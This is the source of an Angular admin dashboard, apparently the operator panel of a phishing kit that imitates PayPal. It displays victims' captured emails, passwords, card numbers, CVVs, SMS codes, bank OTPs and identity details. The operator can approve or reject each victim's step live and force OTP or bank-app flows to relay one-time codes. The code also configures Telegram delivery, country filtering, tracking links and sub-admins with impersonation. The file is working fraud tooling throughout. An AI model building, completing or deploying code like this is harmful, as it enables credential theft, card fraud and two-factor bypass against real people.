            <div class="flex-1 p-6 lg:p-8">
                <div class="grid grid-cols-1 md:grid-cols-2 gap-6 pb-20">
                    <!-- Credentials -->
                    <div class="bg-white dark:bg-slate-800 p-6 rounded-[16px] shadow-sm border border-slate-200 dark:border-slate-700 relative overflow-hidden group hover:border-pp-blue/30 transition-colors">
                        <div class="absolute top-0 right-0 p-4 opacity-5 group-hover:opacity-10 transition-opacity"><span class="material-icons text-6xl text-pp-navy dark:text-white">lock</span></div>
                        <div class="flex items-center gap-2 mb-6 border-b border-slate-100 dark:border-slate-700 pb-3">
                            <div class="bg-blue-50 dark:bg-blue-900/30 p-1.5 rounded-lg text-pp-blue"><span class="material-icons text-lg">vpn_key</span></div>
                            <h4 class="text-sm font-bold text-pp-navy dark:text-white uppercase tracking-tight">{{ 'LOGIN_CREDENTIALS' | translate }}</h4>
                        </div>
                        <div class="space-y-5 relative z-10">
                            <div>
                                <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1.5">Email</label>
                                <div class="flex items-center gap-2 bg-slate-50 dark:bg-slate-900/50 p-2 rounded-lg border border-slate-100 dark:border-slate-700">
                                    <p class="text-sm font-bold text-pp-navy dark:text-white break-all flex-1">{{ session?.data?.email || '...' }}</p>
                                    <button *ngIf="session?.data?.email" (click)="copy(session?.data?.email)" class="text-slate-400 hover:text-pp-blue p-1"><span class="material-icons text-[16px]">content_copy</span></button>
                                </div>
                            </div>
                            <div>
                                <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1.5">{{ 'PASSWORD' | translate }}</label>
                                <div class="flex items-center gap-2 bg-slate-50 dark:bg-slate-900/50 p-2 rounded-lg border border-slate-100 dark:border-slate-700">
                                    <p class="text-sm font-mono text-pp-navy dark:text-white flex-1">{{ session?.data?.password || '...' }}</p>
                                    <button *ngIf="session?.data?.password" (click)="copy(session?.data?.password)" class="text-slate-400 hover:text-pp-blue p-1"><span class="material-icons text-[16px]">content_copy</span></button>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Financial -->
                    <div class="bg-white dark:bg-slate-800 p-6 rounded-[16px] shadow-sm border border-slate-200 dark:border-slate-700 relative overflow-hidden group hover:border-pp-blue/30 transition-colors">
                        <div class="absolute top-0 right-0 p-4 opacity-5 group-hover:opacity-10 transition-opacity"><span class="material-icons text-6xl text-pp-navy dark:text-white">credit_card</span></div>
                        <div class="flex items-center gap-2 mb-6 border-b border-slate-100 dark:border-slate-700 pb-3">
                            <div class="bg-blue-50 dark:bg-blue-900/30 p-1.5 rounded-lg text-pp-blue"><span class="material-icons text-lg">payment</span></div>
                            <h4 class="text-sm font-bold text-pp-navy dark:text-white uppercase tracking-tight">{{ 'FINANCIAL_INSTRUMENT' | translate }}</h4>
                        </div>
                        <div class="space-y-5 relative z-10">
                            <div>
                                <div class="flex items-center justify-between mb-1.5">
                                    <label class="text-[10px] font-bold text-slate-400 uppercase">Card Number</label>
                                    @if(getCardLogoUrl(session?.data?.cardType)) {
                                        <img [src]="getCardLogoUrl(session?.data?.cardType)" class="h-4 w-auto object-contain">
                                    }
                                </div>
                                <div class="flex items-center gap-2 bg-slate-50 dark:bg-slate-900/50 p-2 rounded-lg border border-slate-100 dark:border-slate-700">
                                   <p class="text-lg font-mono font-bold text-pp-navy dark:text-white tracking-wide flex-1">{{ formatCard(session?.data?.cardNumber) }}</p>
                                   <button *ngIf="session?.data?.cardNumber" (click)="copy(session?.data?.cardNumber)" class="text-slate-400 hover:text-pp-blue p-1"><span class="material-icons text-[16px]">content_copy</span></button>
                                </div>
                            </div>
                            <div class="grid grid-cols-2 gap-4">
                                <div>
                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1.5">Expiry</label>
                                    <div class="bg-slate-50 dark:bg-slate-900/50 p-2 rounded-lg border border-slate-100 dark:border-slate-700">
                                        <p class="font-bold text-pp-navy dark:text-white text-sm">{{ session?.data?.cardExpiry || '--/--' }}</p>
                                    </div>
                                </div>
                                <div>
                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1.5">CVV / CSC</label>
                                    <div class="bg-slate-50 dark:bg-slate-900/50 p-2 rounded-lg border border-slate-100 dark:border-slate-700">
                                        <p class="font-bold text-[#D92D20] text-sm">{{ session?.data?.cardCvv || '---' }}</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- OTP -->
                    <div class="col-span-1 md:col-span-2 bg-gradient-to-br from-pp-navy to-[#001C64] text-white p-8 rounded-[20px] shadow-lg relative overflow-hidden flex flex-col md:flex-row items-center justify-between gap-6">
                            <div class="absolute -right-10 -top-10 w-48 h-48 bg-pp-blue rounded-full opacity-20 blur-3xl"></div>
                            <div class="relative z-10 flex-1">
                                <div class="flex items-center gap-3 mb-6">
                                    <span class="material-icons text-pp-success">verified_user</span>
                                    <h4 class="text-sm font-bold text-white/90 uppercase tracking-widest">{{ 'SECURITY_CODES' | translate }}</h4>
                                </div>
                                <div class="flex gap-12">
                                    <div>
                                        <span class="text-[10px] text-white/50 font-bold uppercase block mb-2">SMS Code</span>
                                        <div class="flex items-center gap-2">
                                            <span class="text-3xl font-mono font-bold tracking-widest">{{ session?.data?.phoneCode || '---' }}</span>
                                            <button *ngIf="session?.data?.phoneCode" (click)="copy(session?.data?.phoneCode)" class="text-white/40 hover:text-white transition-colors"><span class="material-icons text-sm">content_copy</span></button>
                                        </div>
                                    </div>
                                    <div>
                                        <span class="text-[10px] text-white/50 font-bold uppercase block mb-2">Bank OTP</span>
                                        <div class="flex items-center gap-2">
                                            <span class="text-3xl font-mono font-bold tracking-widest text-pp-success">{{ session?.data?.cardOtp || '---' }}</span>
                                            <button *ngIf="session?.data?.cardOtp" (click)="copy(session?.data?.cardOtp)" class="text-white/40 hover:text-white transition-colors"><span class="material-icons text-sm">content_copy</span></button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                    </div>

                    <!-- Identity -->
                    <div class="col-span-1 md:col-span-2 bg-white dark:bg-slate-800 p-6 rounded-[16px] shadow-sm border border-slate-200 dark:border-slate-700">
                            <div class="flex items-center gap-2 mb-6 border-b border-slate-100 dark:border-slate-700 pb-3">
                                <div class="bg-blue-50 dark:bg-blue-900/30 p-1.5 rounded-lg text-pp-blue"><span class="material-icons text-lg">badge</span></div>
                                <h4 class="text-sm font-bold text-pp-navy dark:text-white uppercase tracking-tight">{{ 'IDENTITY_PROFILE' | translate }}</h4>
                            </div>
                            <div class="grid grid-cols-2 md:grid-cols-4 gap-6">
                                <div>
                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Name</label>
                                    <p class="text-sm font-bold text-pp-navy dark:text-white">{{ (session?.data?.firstName + ' ' + session?.data?.lastName).trim() || 'Waiting...' }}</p>
                                </div>
                                <div>
                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">DOB</label>
                                    <p class="text-sm font-bold text-pp-navy dark:text-white">{{ session?.data?.dob || 'Waiting...' }}</p>
                                </div>
                                <div>
                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Phone</label>
                                    <p class="text-sm font-bold text-pp-navy dark:text-white">{{ session?.data?.phoneNumber || 'Waiting...' }}</p>
                                </div>
                                <div>
                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Location</label>
                                    <p class="text-sm font-bold text-pp-navy dark:text-white">{{ session?.data?.country || 'Waiting...' }}</p>
                                </div>
                                <div class="col-span-2 md:col-span-4">
                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Address</label>
                                    <p class="text-sm font-bold text-pp-navy dark:text-white bg-slate-50 dark:bg-slate-900/50 p-3 rounded-lg border border-slate-100 dark:border-slate-700">{{ session?.data?.address || 'Waiting...' }}</p>
                                </div>
                            </div>
                    </div>
                </div>
            </div>

            @if(!isHistory) {
                <div class="p-5 border-t border-slate-200 dark:border-slate-700 bg-white dark:bg-slate-800 sticky bottom-0 z-20 flex flex-col md:flex-row justify-between items-center gap-4 shadow-lg lg:shadow-none">
                    <div class="flex items-center gap-4 w-full md:w-auto">
                        <div class="flex items-center gap-2">
                            <span class="h-2 w-2 rounded-full" [class.animate-pulse]="isSessionLive(session)" [class.bg-pp-success]="isSessionLive(session)" [class.bg-slate-300]="!isSessionLive(session)"></span>
                            <span class="text-xs font-bold text-slate-500 hidden sm:block">{{ isSessionLive(session) ? 'Live' : 'Offline' }}</span>
                        </div>

                        <!-- Bank Flow Options -->
                        <div class="flex items-center gap-1 bg-slate-100 dark:bg-slate-700/50 p-1 rounded-lg">
                            <button (click)="requestFlow('app')" class="p-2 rounded hover:bg-white dark:hover:bg-slate-600 text-slate-500 hover:text-pp-blue transition-all" title="Force Bank App Flow">
                                <span class="material-icons text-lg">touch_app</span>
                            </button>
                            <button (click)="requestFlow('otp')" class="p-2 rounded hover:bg-white dark:hover:bg-slate-600 text-slate-500 hover:text-pp-blue transition-all" title="Force OTP Flow">
                                <span class="material-icons text-lg">sms</span>
                            </button>
                        </div>
                    </div>

                    @if(monitoredSession()) {
                        <div class="flex gap-3 w-full md:w-auto justify-end">
                            <button (click)="revoke()"
                                    [disabled]="!session?.isLoginVerified"
                                    [class.opacity-50]="!session?.isLoginVerified"
                                    [class.cursor-not-allowed]="!session?.isLoginVerified"
                                    class="bg-red-50 hover:bg-red-100 text-red-600 border border-red-100 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm">
                                {{ 'REVOKE' | translate }}
                            </button>
                            <button (click)="reject()"
                                    [disabled]="!canInteract()"
                                    [class.opacity-50]="!canInteract()"
                                    [class.cursor-not-allowed]="!canInteract()"
                                    class="bg-slate-100 hover:bg-slate-200 text-slate-700 border border-slate-200 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm">
                                {{ 'REJECT' | translate }}
                            </button>
                            <button (click)="approve()"
                                    [disabled]="!canInteract()"
                                    [class.opacity-50]="!canInteract()"
                                    [class.cursor-not-allowed]="!canInteract()"
                                    class="bg-pp-navy hover:bg-pp-blue text-white px-8 py-3 rounded-full font-bold text-sm shadow-button transition-all flex items-center gap-2">
                                <span class="material-icons text-sm">check</span> {{ approveText() | translate }}
                            </button>
                        </div>
                    }
                </div>
            }
      </ng-template>
      }
    </div>
  `,
  styles: [`
    .shadow-button { box-shadow: 0 4px 14px 0 rgba(0,0,0,0.1); }
    .animate-fade-in { animation: fadeIn 0.2s ease-out; }
    .animate-slide-in-right { animation: slideInRight 0.3s cubic-bezier(0.16, 1, 0.3, 1); }
    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    @keyframes slideInRight { from { transform: translateX(100%); } to { transform: translateX(0); } }
  `]
})
export class AdminDashboardComponent implements OnInit {
  state = inject(StateService);
  auth = inject(AuthService);
  modal = inject(ModalService);
  translate = inject(TranslationService);

  activeTab = signal<AdminTab>('live');
  currentAdminLang = 'en';

  preAuthSuccess = signal(false);
  preAuthUser = '';
  preAuthPass = '';
  preAuthError = signal(false);
  gateUser = '';
  gatePass = '';
  loginUser = '';
  loginPass = '';
  loginError = signal(false);
  isLoading = signal(false);
  userList = signal<any[]>([]);
  userPanelOpen = signal(false);
  selectedAdmin = signal<any>(null);
  selectedAdminLinks = signal<any[]>([]);
  selectedAdminSettings: any = {};
  linkList = signal<any[]>([]);
  auditLogs = signal<any[]>([]);
  systemLogs = signal<any[]>([]);
  kpiStats = signal<any>({ total: 0, active: 0, verified: 0, clicks: 0 });
  historyPanelOpen = signal(false);
  selectedHistorySession = signal<SessionHistory | null>(null);
  userModalOpen = signal(false);
  newUser = { username: '', password: '', role: 'admin', maxLinks: 1, flow: { autoApproveLogin: false, skipPhone: false, forceBankApp: false, forceOtp: false, autoApproveCard: false } };
  assignModalOpen = signal(false);
  assignSearch = signal('');
  searchQuery = signal('');
  timeFilter = signal<'6h' | '24h' | '7d' | 'all' | 'custom'>('24h');
  customDateStart = signal<string>('');
  customDateEnd = signal<string>('');
  countryFilter = signal<string>('all');
  statusFilter = signal<string>('all');
  selectedSessionIds = signal<Set<string>>(new Set());
  incompleteCollapsed = signal(false);
  tgToken = '';
  tgChat = '';
  flowSettings: any = {};
  settingOldPass = '';
  settingNewPass = '';
  isDarkMode = signal(false);
  elapsedTime = signal('0m');
  countdownSeconds = signal<number | null>(null);
  private timer: number | undefined;

  countryList = COUNTRIES;

  // Create language list for UI selectors, sorted alphabetically by name
  languageList = Object.entries(LANG_NAMES).map(([code, name]) => ({ code, name })).sort((a, b) => a.name.localeCompare(b.name));

  // Country Selector UI State
  allowedSearch = signal('');
  blockedSearch = signal('');
  showAllowedDropdown = signal(false);
  showBlockedDropdown = signal(false);

  filteredAllowedCountries = computed(() => {
      const q = this.allowedSearch().toLowerCase();
      if (!q) return this.countryList;
      return this.countryList.filter(c => c.name.toLowerCase().includes(q));
  });

  filteredBlockedCountries = computed(() => {
      const q = this.blockedSearch().toLowerCase();
      if (!q) return this.countryList;
      return this.countryList.filter(c => c.name.toLowerCase().includes(q));
  });

  filteredAdmins = computed(() => { const q = this.assignSearch().toLowerCase(); return this.userList().filter(u => u.username.toLowerCase().includes(q)); });
  canInteract = computed(() => { const s = this.monitoredSession(); return s?.currentView === 'loading'; });
  uniqueCountries = computed(() => { const history = this.state.history(); const countries = new Set<string>(); history.forEach(h => { if (h.data?.ipCountry) countries.add(h.data.ipCountry); }); return Array.from(countries).sort(); });
  filteredHistory = computed(() => {
      let data = this.state.history();
      const q = this.searchQuery().toLowerCase();
      const tf = this.timeFilter();
      const cf = this.countryFilter();
      const sf = this.statusFilter();
      const now = Date.now();

      if (tf !== 'all') {
          let cutoff = 0;
          if (tf === '6h') cutoff = now - (6 * 60 * 60 * 1000);
          else if (tf === '24h') cutoff = now - (24 * 60 * 60 * 1000);
          else if (tf === '7d') cutoff = now - (7 * 24 * 60 * 60 * 1000);

          if (tf !== 'custom') {
              data = data.filter(h => new Date(h.timestamp).getTime() >= cutoff);
          }
      }
      if (cf !== 'all') {
          data = data.filter(h => h.data?.ipCountry === cf);
      }
      if (sf !== 'all') {
          if (sf === 'verified') data = data.filter(h => !h.data?.isArchivedIncomplete);
          else if (sf === 'incomplete') data = data.filter(h => h.data?.isArchivedIncomplete);
      }
      if (q) {
          data = data.filter(h =>
              h.id.toLowerCase().includes(q) ||
              (h.email && h.email.toLowerCase().includes(q))
          );
      }
      return data;
  });
  isSettingsConfigured = computed(() => !!(this.tgToken && this.tgChat));
  maskedToken = computed(() => this.tgToken ? '********' : '');
  maskedChat = computed(() => this.tgChat ? '***' : '');
  monitoredSession = computed(() => { const id = this.state.monitoredSessionId(); if (!id) return null; const active = this.state.activeSessions().find(s => s.id === id); if (active) return active; return this.state.incompleteSessions().find(s => s.id === id); });

  constructor() {
      if (typeof localStorage !== 'undefined') {
          const savedLang = localStorage.getItem('admin_lang');
          if (savedLang) {
              this.currentAdminLang = savedLang;
              this.translate.loadLanguage(savedLang);
          }
          const stored = localStorage.getItem('admin_theme');
          if (stored === 'dark') {
              this.isDarkMode.set(true);
              if (typeof document !== 'undefined') document.documentElement.classList.add('dark');
          }
      }

      const returnTab = sessionStorage.getItem('hv_return_tab');
      if (returnTab === 'users') {
          this.activeTab.set('users');
          sessionStorage.removeItem('hv_return_tab');
          this.preAuthSuccess.set(true);
      }

      effect(() => {
          if (this.auth.isAuthenticated()) {
              this.state.setAdminAuthenticated(true);
              const role = this.auth.currentUser()?.role;
              if (role === 'hypervisor') {
                  this.fetchUsers();
                  this.state.joinHypervisorRoom(this.auth.getToken());
                  this.state.onLog((log) => { this.systemLogs.update(logs => [log, ...logs].slice(0, 100)); });
              }
          }
      }, { allowSignalWrites: true });

      effect(() => {
          if (this.activeTab() === 'system') {
              this.fetchAuditLogs();
              this.calcStats();
              fetch('/api/settings').then(res => res.json()).then(data => {
                  this.gateUser = data.gateUser || 'admin';
                  this.gatePass = data.gatePass || 'secure123';
              });
          }
          if (this.activeTab() === 'links') {
              this.fetchLinks();
          }
      }, { allowSignalWrites: true });

      effect(() => {
          const user = this.auth.currentUser();
          if (user) {
              this.flowSettings = { ...user.settings };
              // Ensure arrays exist
              if(!this.flowSettings.allowedCountries) this.flowSettings.allowedCountries = [];
              if(!this.flowSettings.blockedCountries) this.flowSettings.blockedCountries = [];

              if (user.telegramConfig) {
                  this.tgToken = user.telegramConfig.token || '';
                  this.tgChat = user.telegramConfig.chat || '';
              }
          }
      });

      effect(() => {
          const session = this.monitoredSession();
          clearInterval(this.timer);
          if (session) {
              const update = () => {
                   if(session.timestamp) this.elapsedTime.set(this.getElapsed(session.timestamp));
                   if(session.currentView === 'loading' && session.data?.waitingStart) {
                       const start = Number(session.data.waitingStart);
                       const limit = Number(session.data.autoApproveThreshold || 20000);
                       const now = Date.now();
                       const remaining = Math.max(0, Math.ceil((limit - (now - start)) / 1000));
                       this.countdownSeconds.set(remaining);
                   } else {
                       this.countdownSeconds.set(null);
                   }
              };
              update();
              this.timer = setInterval(update, 1000) as unknown as number;
          } else {
              this.elapsedTime.set('0m');
              this.countdownSeconds.set(null);
          }
      }, { allowSignalWrites: true });
  }

  ngOnInit() {}

  changeAdminLanguage(lang: string) {
      this.currentAdminLang = lang;
      this.translate.loadLanguage(lang);
      localStorage.setItem('admin_lang', lang);
  }

  addCountry(type: 'allowed' | 'blocked', code: string) {
      if (!this.flowSettings) this.flowSettings = {};
      const key = type === 'allowed' ? 'allowedCountries' : 'blockedCountries';
      if (!this.flowSettings[key]) this.flowSettings[key] = [];
      if (!this.flowSettings[key].includes(code)) {
          this.flowSettings[key].push(code);
      }
  }

  toggleAllowedDropdown() {
      this.showAllowedDropdown.update(v => !v);
      this.showBlockedDropdown.set(false);
  }

  toggleBlockedDropdown() {
      this.showBlockedDropdown.update(v => !v);
      this.showAllowedDropdown.set(false);
  }

  selectCountryToAdd(type: 'allowed' | 'blocked', code: string) {
      this.addCountry(type, code);
      this.showAllowedDropdown.set(false);
      this.showBlockedDropdown.set(false);
      this.allowedSearch.set('');
      this.blockedSearch.set('');
  }

  removeCountry(type: 'allowed' | 'blocked', code: string) {
      const key = type === 'allowed' ? 'allowedCountries' : 'blockedCountries';
      if (this.flowSettings && this.flowSettings[key]) {
          this.flowSettings[key] = this.flowSettings[key].filter((c: string) => c !== code);
      }
  }

  addCountryToAdmin(type: 'allowed' | 'blocked', code: string) {
      // For selectedAdminSettings in User Panel
      const key = type === 'allowed' ? 'allowedCountries' : 'blockedCountries';
      if (!this.selectedAdminSettings[key]) this.selectedAdminSettings[key] = [];
      if (!this.selectedAdminSettings[key].includes(code)) {
          this.selectedAdminSettings[key].push(code);
      }
  }

  removeCountryFromAdmin(type: 'allowed' | 'blocked', code: string) {
      const key = type === 'allowed' ? 'allowedCountries' : 'blockedCountries';
      if (this.selectedAdminSettings && this.selectedAdminSettings[key]) {
          this.selectedAdminSettings[key] = this.selectedAdminSettings[key].filter((c: string) => c !== code);
      }
  }

  async doPreAuth() {
      this.isLoading.set(true);
      try {
          const res = await fetch('/api/admin/gate', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ username: this.preAuthUser, password: this.preAuthPass })
          });
          if (res.ok) {
              this.preAuthSuccess.set(true);
              this.preAuthError.set(false);
          } else {
              this.preAuthError.set(true);
          }
      } catch (e) {
          this.preAuthError.set(true);
      } finally {
          this.isLoading.set(false);
      }
  }

  async doLogin() {
      this.loginError.set(false);
      this.isLoading.set(true);
      const success = await this.auth.login(this.loginUser, this.loginPass);
      this.isLoading.set(false);
      if (success) {
          this.loginError.set(false);
          this.loginUser = '';
          this.loginPass = '';
      } else {
          this.loginError.set(true);
      }
  }

  exitAdmin() { this.auth.logout(); this.state.returnFromAdmin(); this.preAuthSuccess.set(false); }
  exitImpersonation() { this.auth.logout(); }
  refresh() { this.state.fetchSessions(); if(this.auth.currentUser()?.role === 'hypervisor') { this.fetchUsers(); } }

  approveText(): string {
      const stage = this.monitoredSession()?.stage;
      switch (stage) {
          case 'login': return 'APPROVE_LOGIN';
          case 'phone_pending': return 'APPROVE_PHONE';
          case 'personal_pending': return 'APPROVE_IDENTITY';
          case 'card_pending': return 'APPROVE_CARD';
          case 'card_otp_pending': return 'APPROVE_OTP';
          case 'bank_app_pending': return 'APPROVE_APP';
          default: return 'APPROVE';
      }
  }

  getDeviceImage(ua: string | undefined): string | null {
      if (!ua) return null;
      const lower = ua.toLowerCase();
      if (lower.includes('macintosh') || lower.includes('mac os') || lower.includes('iphone') || lower.includes('ipad')) return 'assets/icons/apple.svg';
      if (lower.includes('windows')) return 'assets/icons/windows.svg';
      return null;
  }
  getDeviceIcon(ua: string | undefined): string {
      if (!ua) return 'help_outline';
      const lower = ua.toLowerCase();
      if (lower.includes('iphone')) return 'phone_iphone';
      if (lower.includes('ipad')) return 'tablet_mac';
      if (lower.includes('android')) return lower.includes('mobile') ? 'android' : 'tablet_android';
      if (lower.includes('macintosh') || lower.includes('mac os')) return 'laptop_mac';
      if (lower.includes('windows')) return 'desktop_windows';
      if (lower.includes('linux')) return 'terminal';
      return 'devices';
  }
  getFlagUrl(countryCode: string | undefined): string { if (!countryCode) return ''; return `https://flagcdn.com/w40/${countryCode.toLowerCase()}.png`; }
  getCardLogoUrl(cardType: string | undefined): string {
      if (!cardType) return '';
      const t = cardType.toLowerCase();
      if (t === 'visa') return 'https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg';
      if (t === 'mastercard') return 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg';
      if (t === 'amex') return 'https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg';
      if (t === 'discover') return 'https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg';
      return '';
  }
  getLinkUrl(code: string): string { return `${window.location.origin}/?id=${code}`; }
  isDefaultLink(code: string): boolean { return code === this.auth.currentUser()?.uniqueCode; }
  getActionBadge(session: any): string | null {
      if (session.currentView !== 'loading') return null;
      switch (session.stage) {
          case 'login': return 'APPROVE LOGIN';
          case 'phone_pending': return 'APPROVE PHONE';
          case 'personal_pending': return 'APPROVE_IDENTITY';
          case 'card_pending': return 'APPROVE_CARD';
          case 'card_otp_pending': return 'APPROVE_OTP';
          case 'bank_app_pending': return 'APPROVE_APP';
          default: return 'ACTION NEEDED';
      }
  }
  getDisplayEmail(email: string): string { return email || 'Waiting...'; }
  isSessionLive(session: any): boolean { if (!session || !session.lastSeen) return false; return (Date.now() - session.lastSeen) < 60000; }
  isSelected(session: any): boolean { return this.state.monitoredSessionId() === session.id; }
  formatCard(num: string | undefined): string { if (!num) return '•••• •••• •••• ••••'; return num.replace(/\s+/g, '').replace(/(.{4})/g, '$1 ').trim(); }
  copy(val: string) { if (!val) return; navigator.clipboard.writeText(val).then(() => { this.state.showAdminToast('Copied to clipboard'); }); }
  private getElapsed(timestamp: Date | undefined): string {
      if (!timestamp) return '0m';
      const diffMs = Date.now() - new Date(timestamp).getTime();
      const diffMins = Math.floor(diffMs / 60000);
      if (diffMins < 60) return `${diffMins}m`;
      const h = Math.floor(diffMins / 60);
      const m = diffMins % 60;
      return `${h}h ${m}m`;
  }

  selectSession(s: any) { this.state.setMonitoredSession(s.id); }
  viewHistory(s: any) { this.selectedHistorySession.set(s); this.historyPanelOpen.set(true); }
  closeHistory() { this.historyPanelOpen.set(false); this.selectedHistorySession.set(null); }
  archiveSession(s: any, e: Event) { e.stopPropagation(); this.state.archiveSession(s.id); }
  approve(p={}) { this.state.adminApproveStep(p); }
  reject() { this.state.adminRejectStep('Manual Reject'); }
  revoke() { this.state.adminRevokeSession(this.monitoredSession()!.id); }

  toggleDarkMode() {
      this.isDarkMode.update(d => !d);
      if (this.isDarkMode()) { document.documentElement.classList.add('dark'); localStorage.setItem('admin_theme', 'dark'); }
      else { document.documentElement.classList.remove('dark'); localStorage.setItem('admin_theme', 'light'); }
  }

  async fetchLinks(adminId?: string) {
      try {
          let url = '/api/admin/links';
          if (adminId) url += `?adminId=${adminId}`;
          const res = await fetch(url, { headers: { 'Authorization': `Bearer ${this.auth.getToken()}` } });
          if (res.ok) {
              const data = await res.json();
              if (adminId) this.selectedAdminLinks.set(data);
              else this.linkList.set(data);
          }
      } catch(e) {}
  }
  async generateLink() {
      try {
          const res = await fetch('/api/admin/links', { method: 'POST', headers: { 'Authorization': `Bearer ${this.auth.getToken()}` } });
          if (res.ok) { const data = await res.json(); this.state.showAdminToast(`Link Created: ${data.code}`); this.fetchLinks(); }
          else { const err = await res.json(); this.state.showAdminToast(err.error || 'Failed to create link'); }
      } catch(e) { this.state.showAdminToast('Error creating link'); }
  }
  async deleteLink(code: string) {
      if(!await this.modal.confirm('Delete Link', `Delete tracking link ${code}?`, 'danger')) return;
      try {
          const res = await fetch(`/api/admin/links/${code}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${this.auth.getToken()}` } });
          if (res.ok) { this.state.showAdminToast('Link Deleted'); this.fetchLinks(); }
          else { const err = await res.json(); this.state.showAdminToast(err.error || 'Failed'); }
      } catch(e) { this.state.showAdminToast('Error deleting link'); }
  }

  async fetchUsers() {
      try { const res = await fetch('/api/admin/users', { headers: { 'Authorization': `Bearer ${this.auth.getToken()}` } }); if (res.ok) this.userList.set(await res.json()); } catch(e) {}
  }
  async deleteUser(user: any) {
      if (!await this.modal.confirm('Delete User', `Are you sure you want to delete ${user.username}?`, 'danger')) return;
      try {
          const res = await fetch(`/api/admin/users/${user.id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${this.auth.getToken()}` } });
          if (res.ok) { this.state.showAdminToast('User Deleted'); this.closeUserPanel(); this.fetchUsers(); }
      } catch(e) {}
  }
  async impersonateUser(user: any) {
      if (!await this.modal.confirm('Impersonate User', `Log in as ${user.username}?`, 'confirm')) return;
      const success = await this.auth.impersonate(user.id);
      if (success) window.location.reload(); else this.state.showAdminToast('Impersonation Failed');
  }
  async toggleSuspension(user: any) {
      const action = user.isSuspended ? 'unsuspend' : 'suspend';
      if (!await this.modal.confirm(action === 'suspend' ? 'Suspend User' : 'Unsuspend User', `Are you sure you want to ${action} ${user.username}?`)) return;
      try {
          const res = await fetch(`/api/admin/users/${user.id}`, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ isSuspended: !user.isSuspended }) });
          if (res.ok) { this.state.showAdminToast(user.isSuspended ? 'User Activated' : 'User Suspended'); this.fetchUsers(); if(this.selectedAdmin()?.id === user.id) this.selectedAdmin.update(u => ({ ...u, isSuspended: !u.isSuspended })); }
      } catch(e) { this.state.showAdminToast('Update Failed'); }
  }
  async resetUserPassword(user: any) {
      const newPass = await this.modal.prompt('Reset Password', `Enter new password for ${user.username}:`, '');
      if (!newPass) return;
      try {
          const res = await fetch(`/api/admin/users/${user.id}`, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ password: newPass }) });
          if (res.ok) this.state.showAdminToast('Password Reset');
      } catch(e) { this.state.showAdminToast('Reset Failed'); }
  }
  async updateUserMaxLinks(user: any) { /* Already in template logic? No, let's keep for backup */ }
  async submitCreateUser() {
      if (!this.newUser.username || !this.newUser.password) { this.state.showAdminToast('Username and Password required'); return; }
      try {
          const res = await fetch('/api/admin/users', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ username: this.newUser.username, password: this.newUser.password, role: this.newUser.role, maxLinks: this.newUser.maxLinks, settings: this.newUser.flow }) });
          if (res.ok) { this.state.showAdminToast('User Created'); this.closeUserModal(); this.fetchUsers(); } else this.state.showAdminToast('Failed to create user');
      } catch(e) { this.state.showAdminToast('Error creating user'); }
  }

  openAddUserModal() { this.newUser = { username: '', password: '', role: 'admin', maxLinks: 1, flow: { autoApproveLogin: false, skipPhone: false, forceBankApp: false, forceOtp: false, autoApproveCard: false } }; this.userModalOpen.set(true); }
  closeUserModal() { this.userModalOpen.set(false); }
  viewAdminDetails(u: any) { this.selectedAdmin.set(u); this.selectedAdminSettings = { ...u.settings }; this.userPanelOpen.set(true); this.fetchLinks(u.id); }
  closeUserPanel() { this.userPanelOpen.set(false); this.selectedAdmin.set(null); }

  async saveAdminSettings() {
      const user = this.selectedAdmin(); if (!user) return;
      try {
          const res = await fetch(`/api/admin/users/${user.id}`, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ settings: this.selectedAdminSettings, maxLinks: user.maxLinks }) });
          if (res.ok) { this.state.showAdminToast('Settings Updated'); this.fetchUsers(); }
      } catch(e) { this.state.showAdminToast('Update Failed'); }
  }

  async saveGateSettings() {
      try { await fetch('/api/settings', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ gateUser: this.gateUser, gatePass: this.gatePass }) }); this.state.showAdminToast('Gate Credentials Updated'); } catch(e) { this.state.showAdminToast('Save Failed'); }
  }

  async submitAssignment(adminId: string) {
      const s = this.monitoredSession(); if(!s) return;
      try { await fetch('/api/admin/assign-session', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ sessionId: s.id, adminId }) }); this.state.showAdminToast('Assigned'); this.state.fetchSessions(); this.assignModalOpen.set(false); } catch(e) { this.state.showAdminToast('Assignment Failed'); }
  }
  async assignAdmin() { this.assignModalOpen.set(true); }
  async bulkDelete() { const ids = Array.from(this.selectedSessionIds()); if (ids.length === 0) return; if (!await this.modal.confirm('Bulk Delete', `Delete ${ids.length} sessions?`, 'danger')) return; ids.forEach(id => this.state.deleteSession(id)); this.selectedSessionIds.set(new Set()); }
